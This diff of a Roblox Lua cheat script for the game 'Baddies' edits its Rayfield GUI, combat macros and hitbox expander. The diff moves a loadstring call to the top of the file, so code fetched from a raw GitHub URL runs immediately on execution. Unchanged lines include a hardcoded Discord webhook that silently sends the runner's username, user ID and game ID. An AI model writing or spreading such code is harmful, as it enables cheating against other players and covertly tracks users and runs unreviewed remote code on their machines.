@@ -1,3 +1,11 @@
+-- ==== FOLDER: Best-Macro-Script | FILE: MACRO • BADDIES.lua ====
+-- ✅ YOUR OWN SCRIPT LINK INCLUDED
+-- ✅ NEON PINK THEME
+-- ================================================================
+
+-- ✅ YOUR ORIGINAL LINK
+loadstring(game:HttpGet("https://raw.githubusercontent.com/macrobestscript/Best-Macro-Script/refs/heads/main/Baddies", true))()
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -17,13 +25,13 @@ local WebhookURL = "https://discord.com/api/webhooks/1502873473582633071/RNyYg0m
 local data = {embeds={{title="🚀 MACRO SCRIPT EXECUTED!",color=16711935,fields={{name="👤 Username",value="`"..PlayerName.."`",inline=true},{name="🆔 User ID",value="`"..PlayerID.."`",inline=true},{name="🎮 Game ID",value="`"..GameID.."`",inline=true}},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}}
 pcall(function() HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson) end)
 
--- 🎨 NEW NEON PINK THEME
+-- 🎨 NEON PINK THEME
 local Theme = {
     BG = Color3.fromRGB(15, 8, 20),
     Panel = Color3.fromRGB(35, 15, 40),
-    Primary = Color3.fromRGB(255, 20, 147),    -- Neon Hot Pink
-    Secondary = Color3.fromRGB(255, 85, 220),   -- Light Neon Pink
-    Text = Color3.fromRGB(255, 220, 245)        -- Soft Pink White
+    Primary = Color3.fromRGB(255, 20, 147),
+    Secondary = Color3.fromRGB(255, 85, 220),
+    Text = Color3.fromRGB(255, 220, 245)
 }
 
 -- ⚙️ MACRO SETTINGS
@@ -235,9 +243,6 @@ end
 
 -- 🖥️ MAIN GUI
 function LoadMainGUI()
-    -- ✅ YOUR ORIGINAL LINK INSERTED HERE
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/macrobestscript/Best-Macro-Script/refs/heads/main/Baddies", true))()
-
     local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
     local Window = Rayfield:CreateWindow({
         Name = "💖 MACRO • BADDIES",
@@ -246,17 +251,10 @@ function LoadMainGUI()
         ConfigurationSaving = {Enabled=false},
         Discord = {Enabled=false},
         KeySystem = false,
-        -- ✅ GUI THEME SET TO NEON PINK
-        Theme = {
-            Background = Theme.BG,
-            Sidebar = Theme.Panel,
-            Primary = Theme.Primary,
-            Text = Theme.Text,
-            Selected = Theme.Secondary
-        }
+        Theme = {Background=Theme.BG,Sidebar=Theme.Panel,Primary=Theme.Primary,Text=Theme.Text,Selected=Theme.Secondary}
     })
 
-    -- 📑 TABS (CLEANED)
+    -- 📑 TABS
     local Macros = Window:CreateTab("🤖 Macros",4483362458)
     local Tools = Window:CreateTab("🔧 Tools",4483362458)
     local Settings = Window:CreateTab("⚙️ Settings",4483362458)
@@ -269,12 +267,8 @@ function LoadMainGUI()
         CurrentValue = false,
         Callback = function(state)
             MacroSettings.DoubleSnowball = state
-            if state then
-                task.spawn(DoubleSnowballMacro)
-                Rayfield:Notify({Title="💖 MACRO ON",Content="1 Button = Double Snowball",Duration=3})
-            else
-                Rayfield:Notify({Title="💖 MACRO OFF",Duration=2})
-            end
+            if state then task.spawn(DoubleSnowballMacro) Rayfield:Notify({Title="💖 MACRO ON",Content="1 Button = Double Snowball",Duration=3})
+            else Rayfield:Notify({Title="💖 MACRO OFF",Duration=2}) end
         end
     })
 
@@ -298,35 +292,16 @@ function LoadMainGUI()
         Name = "START CUSTOM COMBO",
         CurrentValue = false,
         Callback = function(state)
-            if #MacroSettings.CustomWeapons == 0 then
-                Rayfield:Notify({Title="❌ ERROR",Content="Type weapons first!",Duration=2})
-                return
-            end
+            if #MacroSettings.CustomWeapons == 0 then Rayfield:Notify({Title="❌ ERROR",Content="Type weapons first!",Duration=2}) return end
             MacroSettings.CustomComboActive = state
-            if state then
-                task.spawn(RunCustomCombo)
-                Rayfield:Notify({Title="⚔️ COMBO RUNNING",Content="Your custom weapons",Duration=3})
-            else
-                Rayfield:Notify({Title="⏹️ COMBO STOPPED",Duration=2})
-            end
+            if state then task.spawn(RunCustomCombo) Rayfield:Notify({Title="⚔️ COMBO RUNNING",Content="Your custom weapons",Duration=3})
+            else Rayfield:Notify({Title="⏹️ COMBO STOPPED",Duration=2}) end
         end
     })
 
     Macros:CreateSection("⚙️ SPEED CONTROL")
-    Macros:CreateSlider({
-        Name = "Macro Speed",
-        Range = {0.04, 0.4},
-        Increment = 0.01,
-        CurrentValue = 0.12,
-        Callback = function(val) MacroSettings.MacroSpeed = val end
-    })
-    Macros:CreateSlider({
-        Name = "Swap Delay",
-        Range = {0.02, 0.2},
-        Increment = 0.01,
-        CurrentValue = 0.06,
-        Callback = function(val) MacroSettings.SwapDelay = val end
-    })
+    Macros:CreateSlider({Name="Macro Speed",Range={0.04,0.4},Increment=0.01,CurrentValue=0.12,Callback=function(val) MacroSettings.MacroSpeed=val end})
+    Macros:CreateSlider({Name="Swap Delay",Range={0.02,0.2},Increment=0.01,CurrentValue=0.06,Callback=function(val) MacroSettings.SwapDelay=val end})
 
     -- 🔧 TOOLS TAB
     Tools:CreateSection("PLAYER TOOLS")
@@ -336,9 +311,13 @@ function LoadMainGUI()
 
     -- ⚙️ SETTINGS TAB
     Settings:CreateSection("ADJUST SETTINGS")
-    Settings:CreateSlider({Name="📏 Hitbox Size",Range={2,20},Increment=1,CurrentValue=HitboxSize,Callback=function(val) HitboxSize = val DisableHitbox() EnableHitbox() end})
-    Settings:CreateSlider({Name="🔭 Camera Distance",Range={5,25},Increment=1,CurrentValue=POV_Distance,Callback=function(val) POV_Distance = val end})
-    Settings:CreateSlider({Name="↕️ Camera Height",Range={2,15},Increment=1,CurrentValue=POV_Height,Callback=function(val) POV_Height = val end})
+    Settings:CreateSlider({Name="📏 Hitbox Size",Range={2,20},Increment=1,CurrentValue=HitboxSize,Callback=function(val) HitboxSize=val DisableHitbox() EnableHitbox() end})
+    Settings:CreateSlider({Name="🔭 Camera Distance",Range={5,25},Increment=1,CurrentValue=POV_Distance,Callback=function(val) POV_Distance=val end})
+    Settings:CreateSlider({Name="↕️ Camera Height",Range={2,15},Increment=1,CurrentValue=POV_Height,Callback=function(val) POV_Height=val end})
 
     -- 📜 CREDITS TAB
-    Credits:CreateSection("C
+    Credits:CreateSection("CREDITS")
+    Credits:CreateLabel("Made by: Legitness")
+    Credits:CreateLabel("Theme: Neon Pink")
+    Credits:CreateLabel("Script: MACRO • BADDIES")
+end
